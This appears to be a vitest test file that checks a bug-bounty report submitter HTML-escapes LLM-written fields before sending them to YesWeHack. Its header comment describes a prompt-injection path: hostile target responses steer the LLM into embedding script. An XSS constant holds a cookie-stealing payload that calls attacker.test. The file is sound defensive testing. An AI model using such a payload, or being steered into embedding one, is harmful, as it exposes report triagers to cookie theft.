/**
 * report-submitter.ts — YesWeHack HTML-field escaping (inbound-audit Phase 1).
 *
 * description_html/poc_html/impact_html are submitted to YesWeHack as raw
 * HTML (the field names say so). Their source values (description,
 * reproductionSteps, impact, exploitPayload, evidence) are LLM-authored text
 * generated from a prompt that includes target-controlled HTTP response
 * content with no delimiter isolation — a hostile target could steer that
 * generation to embed a <script> payload, which would previously have landed
 * in the submitted report unescaped (stored-XSS-into-triager). Confirms
 * every *_html field is HTML-escaped before submission.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';

const { postMock } = vi.hoisted(() => ({ postMock: vi.fn() }));

vi.mock('axios', () => ({
  default: { post: postMock },
}));

vi.mock('../lib/runtime-config', () => ({
  runtimeConfig: {
    isPlatformEnabled: () => true,
    get: () => undefined,
  },
}));

vi.mock('../utils/logger', () => ({
  default: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

import { reportSubmitter } from '../lib/intelligence/report-submitter';
import type { SubmissionPayload } from '../lib/intelligence/report-submitter';

const XSS = '<script>fetch("https://attacker.test/steal?c="+document.cookie)</script>';

beforeEach(() => {
  postMock.mockReset();
  postMock.mockResolvedValue({ status: 201, data: { id: 'r1' } });
  process.env.YESWEHACK_API_TOKEN = 'test-token';
});

function makePayload(overrides: Partial<SubmissionPayload> = {}): SubmissionPayload {
  return {
    title: 'Test finding',
    vulnType: 'xss',
    severity: 'high',
    description: `Normal text ${XSS} more text`,
    reproductionSteps: `Step 1\n${XSS}\nStep 2`,
    impact: `Impact text ${XSS}`,
    targetUrl: `http://example.test/${XSS}`,
    exploitPayload: XSS,
    evidence: XSS,
    platform: 'yeswehack',
    programHandle: 'test-program',
    ...overrides,
  } as SubmissionPayload;
}

describe('ReportSubmitter — YesWeHack HTML escaping', () => {
  it('escapes <script> tags in description_html', async () => {
    await reportSubmitter.submit(makePayload());
    const [, body] = postMock.mock.calls[0];
    expect(body.description_html).not.toContain('<script>');
    expect(body.description_html).toContain('&lt;script&gt;');
  });

  it('escapes reproductionSteps and targetUrl embedded in description_html', async () => {
    await reportSubmitter.submit(makePayload());
    const [, body] = postMock.mock.calls[0];
    // Only one <script> literal should ever appear across the whole body —
    // zero, since every interpolated field is escaped.
    expect((body.description_html.match(/<script>/g) || []).length).toBe(0);
  });

  it('escapes poc_html (exploitPayload)', async () => {
    await reportSubmitter.submit(makePayload());
    const [, body] = postMock.mock.calls[0];
    expect(body.poc_html).not.toContain('<script>');
    expect(body.poc_html).toContain('&lt;script&gt;');
  });

  it('escapes impact_html', async () => {
    await reportSubmitter.submit(makePayload());
    const [, body] = postMock.mock.calls[0];
    expect(body.impact_html).not.toContain('<script>');
    expect(body.impact_html).toContain('&lt;script&gt;');
  });

  it('falls back to evidence for poc_html when exploitPayload is absent, still escaped', async () => {
    await reportSubmitter.submit(makePayload({ exploitPayload: undefined }));
    const [, body] = postMock.mock.calls[0];
    expect(body.poc_html).not.toContain('<script>');
    expect(body.poc_html).toContain('&lt;script&gt;');
  });
});
